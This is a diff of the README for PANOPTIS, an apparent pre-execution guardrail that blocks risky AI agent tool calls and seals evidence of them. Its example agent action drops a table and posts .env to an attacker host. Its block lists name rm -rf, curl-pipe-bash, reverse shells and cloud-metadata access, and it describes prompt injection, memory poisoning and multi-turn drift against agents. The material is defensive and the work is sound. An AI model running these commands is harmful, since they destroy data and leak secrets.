@@ -1,279 +1,343 @@
 <div align="center">
 
-<img src="https://img.shields.io/pypi/v/panoptis?label=PyPI%20v0.3.1&color=blue&style=for-the-badge" alt="PANOPTIS on PyPI" />
+<img width="120" height="120" alt="Panoptis logo" src="https://github.com/user-attachments/assets/4e6fd818-2458-4ac2-bb9c-25542622dd00" />
 
-# 👁️ PANOPTIS
-### *(formerly AgentWatch)*
+# PANOPTIS
 
-<img width="140" height="140" alt="Panoptis Logo" src="https://github.com/user-attachments/assets/4e6fd818-2458-4ac2-bb9c-25542622dd00" />
+### Decide on every AI agent tool call before it runs.
+**Runtime enforcement and verifiable evidence for autonomous agents.** *(formerly AgentWatch)*
 
-### **The Pre-Execution Guardrail & Cryptographic Attestation Engine for Autonomous AI**
-
-*AI agents are prone to silent failures, ungrounded loops, and catastrophic unintended side effects.*  
-*PANOPTIS acts as an active, inline pre-execution hypervisor — auditing reasoning, enforcing invariant contracts, tracking dynamic information flow, and blocking risky actions before they hit your production infrastructure.*
+[![PyPI](https://img.shields.io/pypi/v/panoptis?style=flat-square&color=2a6fdb)](https://pypi.org/project/panoptis/) [![Python 3.12](https://img.shields.io/badge/python-3.12-2a6fdb?style=flat-square&logo=python&logoColor=white)](https://python.org) [![License](https://img.shields.io/badge/license-Apache_2.0-2a6fdb?style=flat-square)](LICENSE) [![Discord](https://img.shields.io/badge/Discord-join-5865F2?style=flat-square&logo=discord&logoColor=white)](https://discord.gg/UT9uaeY46e) [![Stars](https://img.shields.io/github/stars/Shinraya-Tech-Labs/AgentWatch?style=flat-square&color=d9730d)](https://github.com/Shinraya-Tech-Labs/AgentWatch/stargazers) [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/Shinraya-Tech-Labs/AgentWatch/blob/main/examples/quickstart_panopti_guardrails.ipynb)
 
 <br/>
 
-[![PyPI Version](https://img.shields.io/pypi/v/panoptis?style=flat-square&color=blue)](https://pypi.org/project/panoptis/)
-[![Tests](https://img.shields.io/badge/tests-3%2C060+_passing-brightgreen?style=flat-square)](https://github.com/Shinraya-Tech-Labs/AgentWatch)
-[![Coverage](https://img.shields.io/codecov/c/github/Shinraya-Tech-Labs/AgentWatch?style=flat-square)](https://codecov.io/gh/Shinraya-Tech-Labs/AgentWatch)
-[![License](https://img.shields.io/badge/license-Apache_2.0-blue?style=flat-square)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.12+-blue?style=flat-square&logo=python)](https://python.org)
-[![Discord](https://img.shields.io/badge/Discord-Join_Community-5865F2?style=flat-square&logo=discord)](https://discord.gg/UT9uaeY46e)
-[![Stars](https://img.shields.io/github/stars/Shinraya-Tech-Labs/AgentWatch?style=flat-square&color=gold)](https://github.com/Shinraya-Tech-Labs/AgentWatch/stargazers)
-[![Forks](https://img.shields.io/github/forks/Shinraya-Tech-Labs/AgentWatch?style=flat-square&color=orange)](https://github.com/Shinraya-Tech-Labs/AgentWatch/network)
-[![NSoC](https://img.shields.io/badge/NSoC_26'-participating-purple?style=flat-square)](https://github.com/Shinraya-Tech-Labs/AgentWatch/issues)
-[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/Shinraya-Tech-Labs/AgentWatch/blob/main/examples/quickstart_panopti_guardrails.ipynb)
+<img src="docs/images/readme/hero.png" alt="An agent proposes four things. rm -rf / is blocked and never runs. git push --force asks a human and runs once after approval. ls -la is allowed. An injected line in tool output is removed before the agent reads it." width="760"/>
 
 <br/>
 
-```bash
-# 📦 Install directly from PyPI
-pip install panoptis
-
-# 🎮 Launch Instant Interactive Terminal Demo (Simulates rogue agent attacks)
-panopti demo
-
-# 🌐 Launch Zero-Dependency Local Web Playground
-panopti playground
-```
-
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FShinraya-Tech-Labs%2FAgentWatch&root-directory=agentwatch-landing)
-
-*Decide on every tool call before it executes, and generate tamper-evident cryptographic proof of what happened.*
-
-<br/>
-
-[**Interactive Demo**](#-instant-interactive-demo) · [**Architecture**](#-architecture--dual-plane-design) · [**Target Architecture**](#-target-architecture) · [**Security Gauntlet**](#-inline-pre-execution-security-pipeline) · [**Evidence & Merkle Attestation**](#-cryptographic-witness-attestation) · [**Quick Start**](#-quick-start) · [**Supported Frameworks**](#-supported-frameworks) · [**Comparative Benchmark**](#-how-panoptis-compares) · [**Community**](#-community)
+[**Try it**](#-try-it-in-60-seconds) · [**How it works**](#-how-it-works) · [**Pipeline**](#-the-decision-pipeline) · [**Evidence**](#-evidence-you-can-verify) · [**Benchmarks**](#-benchmarks) · [**Integrations**](#-integrations) · [**Dashboard**](#-dashboard) · [**Roadmap**](#-target-architecture)
 
 </div>
 
 ---
 
-## ⚡ The Silent Failure Crisis in AI Agents
+## ⚡ Why this exists
 
+```text
+Task:     "Clean up the cache and sync the database"
+Reasoning looks confident and well structured.
+Action:   DROP TABLE users; curl -X POST attacker.example -d @.env
 ```
-Agent receives task: "Clean up cache and sync database"
-Reasoning appears confident and well-structured.
-Agent executes: DROP TABLE users; curl -X POST attacker.com -d @.env
-You discover the catastrophic data loss 4 hours later.
-```
 
-**1 in 20 AI agent requests fail silently or perform unintended mutations in production.**
+Logs and traces tell you this happened. They arrive after the table is gone.
 
-Existing observability systems — Langfuse, Arize Phoenix, Datadog — operate **post-hoc**. They tell you what broke **after** the damage is written to disk or exfiltrated over the network. 
+An agent acts with its user's privileges while taking direction from whatever it reads, so a poisoned web page, issue or tool result can steer it. PANOPTIS sits between the agent and its tools. It decides on each call before it runs, checks each result before the agent reads it, and can keep tamper-evident evidence of all of it.
 
-An agent that hallucinates or falls prey to indirect prompt injection is indistinguishable from a succeeding agent unless you evaluate the **action intent, dynamic information flow, and invariant safety** *before execution*.
-
-| The Enterprise Cost of Post-Hoc Tracing | Impact |
-|---|---|
-| **1 in 20** | Agent operations fail silently or introduce data drift |
-| **76%** | Enterprise agent deployments stall within 90 days due to safety fears |
-| **$4.45M** | Average cost of a data breach stemming from compromised automated tooling |
-| **0 ms** | Window to prevent damage once a destructive tool call has executed |
+| | Tracing and logging | PANOPTIS |
+|---|---|---|
+| **When it acts** | After the tool ran | Before the tool runs, and again on its output |
+| **A dangerous call** | Recorded | Blocked, or held for a human |
+| **Injected tool output** | Recorded | Quarantined before the agent reads it |
+| **Audit trail** | Mutable logs | Append-only, Merkle-sealed, independently verifiable |
 
 ---
 
-## 💡 How PANOPTIS Works
+## 🚀 Try it in 60 seconds
 
-PANOPTIS operates as an **inline pre-execution hypervisor** situated between your autonomous agent and external systems (tools, APIs, databases, filesystems, and networks).
+Requires Python 3.12.
 
-```mermaid
-flowchart LR
-    A["🤖 Autonomous Agent<br/>(Claude, LangChain, CrewAI)"] -->|"1. Proposed Action / Tool Call"| HYPERVISOR
-
-    subgraph HYPERVISOR["🛡️ PANOPTIS Hypervisor"]
-        direction TB
-        G1["⚡ Fast Gate (sub-10ms)<br/>AST & Intent Normalization"]
-        G2["🔒 Dynamic Taint Tracking<br/>Dual-Zone DLP & Secret Scrubbing"]
-        G3["🧠 Semantic Invariant Auditor<br/>Crescendo Drift & Memory Sentry"]
-        G4["🌲 Cryptographic Ledger<br/>Append-Only Merkle Tree"]
-        G1 --> G2 --> G3 --> G4
-    end
-
-    HYPERVISOR -->|"✅ ALLOWED"| REAL_WORLD["🌍 Real World Execution<br/>(DB, Filesystem, External APIs)"]
-    HYPERVISOR -.->|"⛔ BLOCKED / VETOED"| DEFENSE["🚫 Terminated / Fallback<br/>(Invariant Tripped, Alert Fired)"]
-    HYPERVISOR -.->|"👤 ESCALATED"| HUMAN["🧑‍💻 Human-in-the-Loop<br/>(Explicit Approval Gate)"]
-
-    style A fill:#1e293b,stroke:#3b82f6,color:#fff
-    style HYPERVISOR fill:#0f172a,stroke:#3ecf8e,color:#fff
-    style REAL_WORLD fill:#0f2a18,stroke:#10b981,color:#fff
-    style DEFENSE fill:#3b1212,stroke:#ef4444,color:#fff
-    style HUMAN fill:#2a230f,stroke:#f59e0b,color:#fff
+```bash
+pip install panoptis
+panopti demo          # terminal attack simulation
+panopti playground    # local browser playground
 ```
 
-### The Architectural Separation
-Self-evaluating models suffer from **structural sycophancy and overconfidence bias**. PANOPTIS decouples policy enforcement from agent reasoning by running independent AST normalizers, information-flow lattice verifiers, and optional secondary model auditors that inspect the command intent with zero access to the agent's internal rationalizations.
+Wrap any Python function:
 
----
+```python
+from panoptis.protect import ActionBlocked, protect_tool
 
-## 🏗️ Architecture & Dual-Plane Design
+@protect_tool
+def execute_system_query(query: str) -> str:
+    return db.execute(query)  # never reached for a blocked call
 
-PANOPTIS is built on two decoupled, complementary planes:
-1. **Enforcement Plane (`panoptis.protect`)**: An ultra-low-latency synchronous gate that validates, rewrites, or terminates tool actions before execution.
-2. **Observation & Evidence Plane (PANOPTIS v3 Evidence Lab)**: A passive, deterministic runtime recorder that serializes immutable execution graphs, computes Merkle trees, and performs shadow replays.
+try:
+    execute_system_query("DROP TABLE users;")
+except ActionBlocked as blocked:
+    print(blocked)
+```
 
-```mermaid
-flowchart TB
-    subgraph INGEST["🔌 Ingestion & Framework Adapters"]
-        direction LR
-        A1["Claude Code Hook"]
-        A2["LangChain / LangGraph"]
-        A3["CrewAI / AutoGen"]
-        A4["smolagents / AutoGPT"]
-        A5["MCP Gateway (Streamable HTTP)"]
-    end
+```text
+execute_system_query: block: [threat:SQL_DROP] DROP TABLE
+```
 
-    INGEST --> SPLIT{"Execution Plane Split"}
+Injected instructions in a tool's result never reach the agent, and the rest of the result is kept:
 
-    subgraph ENFORCE["🛡️ ENFORCEMENT PLANE (Inline Gate & Hypervisor)"]
-        direction TB
-        E1["Pre-Execution Policy Filter"]
-        E2["Shell & SQL AST Sanitizer"]
-        E3["Steganography Neutralizer"]
-        E4["Information Flow Control (IFC)"]
-        E5["Anti-Tamper Process Shield"]
-        E1 --> E2 --> E3 --> E4 --> E5
-    end
-
-    subgraph EVIDENCE["🏛️ EVIDENCE & OBSERVABILITY PLANE (v3 Lab)"]
-        direction TB
-        O1["Canonical Event Schema Normalizer"]
-        O2["Causal Hyperedge DAG Engine"]
-        O3["Domain-Separated Merkle Tree"]
-        O4["L1-L4 Deterministic Shadow Replay"]
-        O5["Witness Attestation Token (Ed25519)"]
-        O1 --> O2 --> O3 --> O4 --> O5
-    end
-
-    SPLIT -->|"Synchronous Pre-Check"| ENFORCE
-    SPLIT -->|"Immutable Telemetry"| EVIDENCE
-
-    ENFORCE --> OUTPUT["🚀 Protected Host / Network / Tools"]
-    EVIDENCE --> STORAGE["💾 Isolated Multi-Tenant DB<br/>(PostgreSQL / SQLite)"]
-    STORAGE --> DASH["📊 Next.js Real-Time Dashboard<br/>(WebSockets + Recharts)"]
-
-    style INGEST fill:#0f172a,stroke:#64748b,color:#fff
-    style ENFORCE fill:#172554,stroke:#3b82f6,color:#fff
-    style EVIDENCE fill:#064e3b,stroke:#10b981,color:#fff
-    style DASH fill:#1e1e2e,stroke:#a855f7,color:#fff
+```text
+Release notes.
+[AGENTWATCH: removed a line containing instructions addressed to the model (60 chars)]
+Version 2 adds caching.
 ```
 
 ---
 
-## 🔐 Inline Pre-Execution Security Pipeline
+## 💡 How it works
 
-Every action initiated by an agent runs through an adversarial gauntlet with **sub-10ms overhead**:
+**One boundary, four steps, shared by every enforcing integration.**
 
-```mermaid
-flowchart TD
-    START["📥 Inbound Agent Action<br/>(Tool / Shell / SQL / Network)"] --> PARSE["⚡ AST Parsing & Intent Normalization<br/>(De-obfuscate split flags, long-form syntax, RCE chains)"]
-    
-    PARSE --> TAINT{"🔒 Dynamic Taint Tracking<br/>(Has secret touched memory?)"}
-    TAINT -->|Yes: Sink is Public| BLOCK_TAINT["⛔ BLOCKED: Lattice Violation<br/>(Prevent Turn 1 read to Turn 2 exfil)"]
-    TAINT -->|No: Flow Valid| STEGO["🧹 Steganography Neutralizer<br/>(Strip trailing tabs/spaces, zero-width unicode)"]
+<p align="center">
+  <img src="docs/images/readme/how-it-works.png" alt="An agent proposes a tool call. Inside the enforcement boundary it is decided, run at most once, inspected and recorded. A denied call goes to blocked and the tool never runs. The tool talks to the outside world only in the run step, and the sanitized result returns to the agent." width="760"/>
+</p>
 
-    STEGO --> POLICY{"🔍 Policy & Invariant Check"}
-    POLICY -->|Critical Destructive Pattern| BLOCK_CRIT["⛔ BLOCKED: Destructive Mutation<br/>(rm -rf, DROP TABLE, mkfs, kill)"]
-    POLICY -->|Needs Confirmation| HITL["👤 Human In The Loop Gate"]
-    POLICY -->|Passed Guardrails| ATTEST["🌲 Compute Merkle Leaf & Append to Witness Chain"]
+PANOPTIS has two planes. The **enforcement plane** (`panoptis.protect`) makes the decisions. The **evidence plane** (the v3 Evidence Lab) is passive: it records, seals, compares and replays, and stops nothing.
 
-    HITL -->|Operator Approved| ATTEST
-    HITL -->|Operator Denied / Timeout| BLOCK_DENY["⛔ BLOCKED: Rejected by Operator"]
-
-    ATTEST --> EXEC["✅ DISPATCH ACTION TO HOST"]
-
-    style START fill:#1e293b,stroke:#3ecf8e,color:#fff
-    style BLOCK_TAINT fill:#3b1212,stroke:#ef4444,color:#fff
-    style BLOCK_CRIT fill:#3b1212,stroke:#ef4444,color:#fff
-    style BLOCK_DENY fill:#3b1212,stroke:#ef4444,color:#fff
-    style EXEC fill:#0f2a18,stroke:#10b981,color:#fff
-    style HITL fill:#2a230f,stroke:#f59e0b,color:#fff
-```
-
-### What PANOPTIS Blocks By Default:
-- **Destructive File Operations**: `rm -rf /`, raw partition overwrites, recursive permission resets (`chmod 777`).
-- **Remote Code Execution & Piping**: `curl ... | bash`, `wget -O- | sh`, reverse shell payloads, process injection.
-- **Database Truncation**: `DROP DATABASE`, unconstrained `DELETE FROM` without `WHERE` clauses, schema corruption.
-- **Egress & SSRF Protection**: Requests to loopback (`127.0.0.1`), link-local (`169.254.169.254` cloud metadata), private IP RFC1918 blocks.
-- **Guardian Tampering**: Commands attempting to kill monitoring processes (`pkill`, `killall`) or delete audit databases (`rm panopti.db`).
-- **Memory Poisoning**: Injection of malicious facts into persistent agent memory stores (`store_memory`, `save_fact`).
-- **Crescendo Multi-Turn Drift**: Gradual, multi-turn prompt injection attempts that subtly steer the agent away from its original objective.
+<p align="center">
+  <img src="docs/images/readme/architecture.png" alt="Enforcing integrations (Python SDK, frameworks, Claude Code, MCP gateway) feed the enforcement plane of pipeline, approvals, emergency stop and output checks. It writes records to the evidence plane of store, Merkle seals, replay and verifier. Both use a shared REST API, dashboard, CLI and storage." width="760"/>
+</p>
 
 ---
 
-## 🌲 Cryptographic Witness Attestation
+## 🔐 The decision pipeline
 
-Every executed tool action and observation is anchored into an **append-only domain-separated Merkle Tree**, generating verifiable audit trails that cannot be forged or tampered with even by privileged administrators.
+**A blocked call never runs, and a failure inside the pipeline blocks too.**
 
-```mermaid
-sequenceDiagram
-    autonumber
-    participant Agent as 🤖 Agent
-    participant Guard as 🛡️ PANOPTIS Gate
-    participant Tree as 🌲 Merkle Tree Store
-    participant Auditor as 📜 Verifier / Regulator
+<p align="center">
+  <img src="docs/images/readme/decision-pipeline.png" alt="Ten steps in order: identity, control, threat analysis, RBAC, loops, intent, human approval when escalated, final stop check, run, inspect output. A block in steps one to six, a denied approval or a tripped stop ends in refused, and the tool body never runs. An unsafe result is withheld or sanitized. Opt-in stages are off by default." width="760"/>
+</p>
 
-    Agent->>Guard: Propose ToolAction(action_id, tool, args)
-    Guard->>Guard: Validate Invariants & Security Lattice
-    Guard->>Tree: Append Leaf: H(0x00 || CanonicalJSON(Action))
-    Tree-->>Guard: Updated Merkle Root (R_i)
-    Guard->>Agent: Allow Execution
-    Agent-->>Guard: ToolResult(output)
-    Guard->>Tree: Append Leaf: H(0x00 || CanonicalJSON(Result))
-    Tree-->>Guard: Updated Merkle Root (R_i+1)
+### Stopped by default
 
-    Note over Guard,Tree: Cryptographic Inclusion Proof Generation
-    Auditor->>Tree: Request Inclusion Proof for Action X
-    Tree-->>Auditor: Audit Token (Sibling Hashes + Root Signature)
-    Auditor->>Auditor: verify_inclusion(action_hash, proof, root)
-    Note over Auditor: ✅ Mathematically Guaranteed Execution Sequence
-```
+Each row was run through the default pipeline.
 
-- **Domain Separation**: Prefixes leaf nodes with `0x00` and internal branch nodes with `0x01` to eliminate second preimage attacks.
-- **Cryptographic Shredding**: Per-subject AES-256-GCM encryption with hashes committed over ciphertext, providing compliance with GDPR "Right to be Forgotten" while maintaining Merkle tree mathematical integrity.
-- **Hardware-Ready Signatures**: Audit tokens signed via HMAC-SHA256 or asymmetric Ed25519.
+| Category | Example | Result |
+|---|---|---|
+| Destructive files and disks | `rm -rf /` · `chmod -R 777 /` · `dd if=/dev/zero of=/dev/sda` | Blocked |
+| Remote code execution | `curl … \| bash` · `wget -O- … \| sh` · reverse shells | Blocked |
+| Database destruction | `DROP DATABASE` · `DELETE` with no `WHERE` | Blocked |
+| Cloud metadata access | `http://169.254.169.254/…` | Blocked |
+| Private network access | `127.0.0.1` · RFC 1918 addresses | Escalated; blocked with no approval channel |
+| Injected tool output | Instruction lines in a result | Quarantined |
+
+> [!NOTE]
+> These are pattern and parser rules, so they catch known forms. Novel encodings and paraphrased injections can evade them. Read [what PANOPTIS does not do](#-what-panoptis-does-not-do).
 
 ---
 
-## 🔁 Deterministic Shadow Replay
+## 🌲 Evidence you can verify
 
-How do you debug an agent that failed 3 steps into a 20-step execution without re-running expensive or irreversible API calls?
+**Editing, reordering or truncating sealed evidence is detected by a verifier that does not need PANOPTIS.**
 
-PANOPTIS includes **Deterministic Shadow Replay (`panoptis.replay.shadow`)**, enabling zero-cost replay against new models or updated prompt templates while answering all tool interactions from the recorded cryptographic evidence store:
+<p align="center">
+  <img src="docs/images/readme/evidence.png" alt="Records are sealed every 200 records or 30 seconds per tenant into hash-chained Merkle segments. The head is anchored outside the store. A standalone verifier takes an exported bundle and the expected head and reports intact, or fails if evidence was edited, reordered or truncated." width="760"/>
+</p>
 
-```mermaid
-sequenceDiagram
-    participant Replay as 🔄 Shadow Replay Runner
-    participant Model as 🧠 Evaluated Model (v2)
-    participant Store as 💾 Tool Evidence Store
-    participant World as 🌍 Real World (ISOLATED)
+```python
+from panoptis.protect import ProtectionPipeline, ProtectLedger, protect_tool
 
-    Replay->>Model: Replay Prompt with Step Context
-    Model-->>Replay: Proposed Tool Action: search_catalog(query)
-    Replay->>Store: Lookup Exact Tool Evidence (Hash Match)
-    Store-->>Replay: Return Recorded Result (Zero Cost, No Execution)
-    Note over World: 🚫 Real world is never contacted!
+pipeline = ProtectionPipeline(ledger=ProtectLedger("sqlite:///evidence.db"))
 
-    Replay->>Replay: Compare Trajectory with Original Run
-    alt Trajectory Matches
-        Note over Replay: Result: IDENTICAL_REPLAY
-    else Model Diverges Intelligently
-        Note over Replay: Result: DETERMINISTIC_CORROBORATION
-    else Uncorrelated Output
-        Note over Replay: Result: STOCHASTIC_MODEL_DIVERGENCE
-    end
+@protect_tool(tool="bash", pipeline=pipeline, agent_id="coder", session_id="run-1")
+def bash(command: str) -> str: ...
+```
+
+```bash
+panoptis protect evidence verify --store sqlite:///evidence.db
+```
+
+- **Domain-separated Merkle trees** prefix leaves with `0x00` and branches with `0x01`.
+- **Crypto-shredding** encrypts subject payloads with AES-256-GCM over committed ciphertext, so erasing a key leaves the proofs valid. Needs `panoptis[crypto]`.
+- **Attestation tokens** are signed with HMAC-SHA256 or Ed25519.
+
+> [!IMPORTANT]
+> Evidence is written only when a ledger is configured. Records are integrity-protected once sealed, and an anchor must live where a store writer cannot change it. See [docs/EVIDENCE_INTEGRITY.md](docs/EVIDENCE_INTEGRITY.md).
+
+### Shadow replay
+
+**Replay a recorded run against a new model without touching the real world.** Every tool call is answered from evidence, and the traces are compared.
+
+<p align="center">
+  <img src="docs/images/readme/shadow-replay.png" alt="A replay runner sends each recorded step to the model under test. Its tool actions are answered from recorded evidence and the real world is never contacted. The traces are compared and classified as identical replay, failure reproduced, model diverged, or not enough evidence." width="760"/>
+</p>
+
+---
+
+## 📊 Benchmarks
+
+**A decision costs about 0.3 ms at the median, or about 1.5–1.9 ms with durable SQLite evidence.**
+
+<p align="center">
+  <img src="docs/images/readme/benchmark-latency.png" alt="Latency per path on a log axis. Without evidence recording the median is 0.25 to 0.56 milliseconds. With a SQLite evidence store the median is 1.50 to 1.85 milliseconds, or 5.86 for an approved escalation, with p99 values of about 18 to 60 milliseconds." width="760"/>
+</p>
+
+| Path | p50, no evidence | p99, no evidence | p50, SQLite | p99, SQLite |
+|---|---:|---:|---:|---:|
+| Allow | 0.26 ms | 0.54 ms | 1.55 ms | 53.07 ms |
+| Block | 0.33 ms | 0.46 ms | 1.50 ms | 59.55 ms |
+| Rewrite arguments | 0.31 ms | 0.56 ms | 1.85 ms | 18.06 ms |
+| Sanitize output | 0.25 ms | 0.58 ms | 1.72 ms | 17.82 ms |
+| Approved escalation | 0.56 ms | 0.71 ms | 5.86 ms | 25.91 ms |
+
+Throughput was about 1,900–2,500 decisions per second in one process, across 1, 4 and 8 threads. Disk writes dominate the SQLite tail.
+
+### Detection on the synthetic corpus
+
+| Threat category | Attacks | Benign controls | Detected | False positives | Outcome |
+|---|---:|---:|---:|---:|---|
+| Dangerous tool arguments | 24 | 12 | 24 | 0 | Blocked |
+| Secret exposure | 4 | 2 | 4 | 0 | Half blocked, half redacted |
+| Prompt injection in tool output | 7 | 5 | 7 | 0 | Sanitized; legitimate content kept |
+| Policy violations (RBAC) | 6 | 3 | 6 | 0 | Blocked |
+| Loops | 4 | 3 | 4 | 0 | Escalated |
+| Intent mismatch | 7 | 5 | 7 | 0 | Escalated |
+
+All integrations agree on dangerous arguments: pipeline, `protect_tool`, MCP gateway, and the 19 attack cases expressible through the Claude Code hook contract.
+
+> [!WARNING]
+> **Read these numbers with care.** The corpus is 82 synthetic cases written by this project, and two real defects it found were fixed before this run. A perfect score shows the rules handle these cases, not that unseen attacks are caught. No external dataset or competitor comparison is involved.
+
+Measured at commit `54ec3de` on Python 3.12.4, Windows 11, AMD64 with 16 logical CPUs, in-process with a no-op tool. [Full report](benchmarks/results/protect_eval/REPORT.md) · [method](docs/EVALUATION.md) · [raw results](benchmarks/results/protect_eval/results.json)
+
+```bash
+python -m benchmarks.protect_eval.run --out benchmarks/results/protect_eval --iterations 300
 ```
 
 ---
 
-## 🧭 Target Architecture
+## 🔌 Integrations
 
-> **This section describes where PANOPTIS is going, not what ships today.** Execution cells, leases, label-based information flow, the temporal engine and witnessed evidence checkpoints are design targets. For what is implemented and how it is verified, see [docs/CLAIMS.md](docs/CLAIMS.md), [docs/ADAPTER_SUPPORT.md](docs/ADAPTER_SUPPORT.md) and [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md).
+An integration either **enforces** before a tool runs or only **observes** afterwards. `panoptis protect support` prints the full matrix, and [docs/ADAPTER_SUPPORT.md](docs/ADAPTER_SUPPORT.md) lists every limitation.
+
+| Integration | Mode | Entry point | Main limit |
+|---|---|---|---|
+| Any Python function | 🛡️ Enforces | `protect_tool()` | Only calls made through the wrapper |
+| Generic agents | 🛡️ Enforces | `watch(agent, protection=...)` | Only tool-like methods |
+| LangChain tools | 🛡️ Enforces | `protect_langchain_tool` | Tools must be wrapped before the agent runs them |
+| LangGraph | 🛡️ Enforces | `protect_langgraph_tool_node` | Tools called outside a `ToolNode` are not covered |
+| AutoGen 0.4+ | 🛡️ Enforces | `protect_autogen_tool` | Tool calls only |
+| smolagents | 🛡️ Enforces | `protect_smolagents_agent` | `CodeAgent`'s interpreter is not a tool call |
+| Claude Code | 🛡️ Enforces | `panoptis protect claude-hook install` | Hook contract tested; real-CLI test still to run |
+| MCP servers | 🛡️ Enforces | `panoptis protect mcp-gateway` | Only clients routed through the gateway |
+| CrewAI, OpenAI Agents SDK, AutoGPT, OpenClaw | 👁️ Observes | `panoptis.adapters` | Records events; stops nothing |
+| Framework callback adapters, CLI agents | 👁️ Observes | `panoptis.adapters` | Records events; stops nothing |
+
+Runtime setup is in [`docs/adapters/`](docs/adapters/). `panoptis protect discover` finds local agents and MCP servers and reports which are monitored.
+
+---
+
+## 🖥️ Dashboard
+
+Real screens from the security dashboard, driven by real pipeline decisions in the [browser test suite](tests/e2e_dashboard/).
+
+<table>
+  <tr>
+    <td width="50%" valign="top"><img src="docs/screenshots/dashboard/01-overview-acme.png" alt="Security overview for one tenant"/><br/><sub><b>Overview.</b> Verdicts and recent decisions for one tenant.</sub></td>
+    <td width="50%" valign="top"><img src="docs/screenshots/dashboard/02-decisions-blocked-detail.png" alt="Detail of a blocked decision"/><br/><sub><b>Decisions.</b> Why a call was blocked, stage by stage.</sub></td>
+  </tr>
+  <tr>
+    <td width="50%" valign="top"><img src="docs/screenshots/dashboard/03-approval-pending.png" alt="A tool call waiting for approval"/><br/><sub><b>Approvals.</b> An escalated call waits for its exact action digest to be approved.</sub></td>
+    <td width="50%" valign="top"><img src="docs/screenshots/dashboard/05-emergency-stop-active.png" alt="Emergency stop active"/><br/><sub><b>Emergency stop.</b> New tool calls stop across the deployment.</sub></td>
+  </tr>
+</table>
+
+---
+
+## 🧰 Run it for real
+
+<details open>
+<summary><b>Protect an agent</b></summary>
+
+```python
+from panoptis import watch
+from panoptis.protect import ProtectionPipeline
+
+class Agent:
+    def run(self, command: str) -> str:
+        return f"ran {command}"
+
+agent = watch(Agent(), session_id="prod-01", protection=ProtectionPipeline())
+agent.run("ls")          # runs
+agent.run("rm -rf /")    # raises ActionBlocked
+```
+
+Without `protection=`, `watch()` applies pattern rules only: no RBAC, loop, intent or approval stages, and no output sanitization.
+
+</details>
+
+<details>
+<summary><b>Enable the opt-in stages</b></summary>
+
+```python
+from panoptis.protect import ProtectionConfig, ProtectionPipeline
+
+pipeline = ProtectionPipeline(config=ProtectionConfig.sovereign())
+```
+
+Test this on your own workloads first. These stages are heuristic, and the steganography stage rewrites text in tool arguments, including Markdown line breaks, some Unicode and emoji sequences.
+
+</details>
+
+<details>
+<summary><b>Start the full stack</b></summary>
+
+```bash
+git clone https://github.com/Shinraya-Tech-Labs/AgentWatch.git
+cd AgentWatch
+cp .env.example .env   # set AGENTWATCH_API_KEY, POSTGRES_PASSWORD and REDIS_PASSWORD
+docker compose up -d
+```
+
+- **Dashboard:** `http://localhost:3000/security`
+- **API docs:** `http://localhost:8000/docs`
+- **Event stream:** `ws://localhost:8000/ws/events`
+
+</details>
+
+<details>
+<summary><b>CLI reference</b></summary>
+
+```bash
+# Protection
+panoptis protect check "rm -rf /"       # score a command
+panoptis protect status                 # verdicts, kill switch, suspensions
+panoptis protect decisions              # recent decisions
+panoptis protect approvals list         # calls waiting for a person
+panoptis protect control --help         # emergency stop and suspensions
+panoptis protect doctor                 # diagnose the setup
+panoptis protect redteam                # run simulated attacks
+
+# Evidence
+panoptis protect evidence verify        # verify chain, roots and envelopes
+panoptis protect evidence export --help # export a verifiable bundle
+
+# Forensics
+panoptis observe python agent.py        # record an agent run
+panoptis inspect latest                 # reconstruct what happened
+panoptis compare run_A run_B            # find the first divergence
+panoptis replay latest --level L2       # replay from evidence
+panoptis session rollback <id>          # restore a filesystem snapshot
+```
+
+</details>
+
+---
+
+## 🧱 What PANOPTIS does not do
+
+- **It is not a sandbox.** It runs in the agent's process or next to it. Use OS or container isolation against code that can modify the agent process.
+- **It only sees routed calls.** A tool reached another way bypasses it, and observe-only integrations stop nothing.
+- **It does not interrupt running tools.** An emergency stop blocks new calls and withdraws pending approvals.
+- **It does not prove intent.** Detection is pattern-based, and intent grounding is a heuristic signal.
+
+Full detail: [threat model](docs/THREAT_MODEL.md) · [claims and their evidence](docs/CLAIMS.md)
+
+---
+
+## 🧭 Target architecture
+
+> [!IMPORTANT]
+> **This is where PANOPTIS is going, not what ships today.** Execution cells, leases, label-based information flow, the temporal engine and witnessed checkpoints are design targets.
 
 In the end state, agents run without ambient authority, every effect passes one deterministic enforcement kernel, and every decision leaves evidence anyone can verify independently.
-
-### System architecture
 
 **Agents reach the world only through the enforcement node.** Dashed borders sit outside the trusted base.
 
@@ -281,230 +345,67 @@ In the end state, agents run without ambient authority, every effect passes one 
   <img src="docs/images/target-architecture/system-architecture.png" alt="Target system architecture. Execution cells send Actions to the enforcement node, which holds the gateways, the sandbox supervisor, the egress proxy, the enforcement kernel, the evidence writer and the control agent. The egress proxy is the only path to the untrusted world. The control plane exchanges evidence, policy, leases and approvals with the node, and independent verifiers receive bundles and signed checkpoints." width="760"/>
 </p>
 
-The numbers identify the components: (1) agent adapters, (2) execution gateway, (3) identity and authorization, (4) policy engine, (5) temporal engine, (6) information-flow engine, (7) content inspection and advisors, (8) file, process and network sandbox, (9) approval service, (10) emergency control, (11) evidence and verification, (12) tenant-aware storage, (13) API and MCP gateway, (14) dashboard and CLI, (15) deployment and observability.
+<details>
+<summary><b>What the component numbers mean</b></summary>
 
-### Execution lifecycle
+(1) agent adapters · (2) execution gateway · (3) identity and authorization · (4) policy engine · (5) temporal engine · (6) information-flow engine · (7) content inspection and advisors · (8) file, process and network sandbox · (9) approval service · (10) emergency control · (11) evidence and verification · (12) tenant-aware storage · (13) API and MCP gateway · (14) dashboard and CLI · (15) deployment and observability
 
-**No effect is released before its decision is durable.** Every effect follows the same twelve steps, whichever agent, framework or protocol proposed it. Only the path down the left column releases an effect, and every failure leaves a record.
+</details>
 
-<p align="center">
-  <img src="docs/images/target-architecture/execution-lifecycle.png" alt="The twelve-step lifecycle: propose, normalise, admit, authorize, evaluate state, consult advisors, combine, approve when required, record, execute, observe and verify, inspect and deliver. Failures end in one of four outcomes: refused and recorded; no grant and cell paused; killed and session halted; or result withheld." width="760"/>
-</p>
+<details>
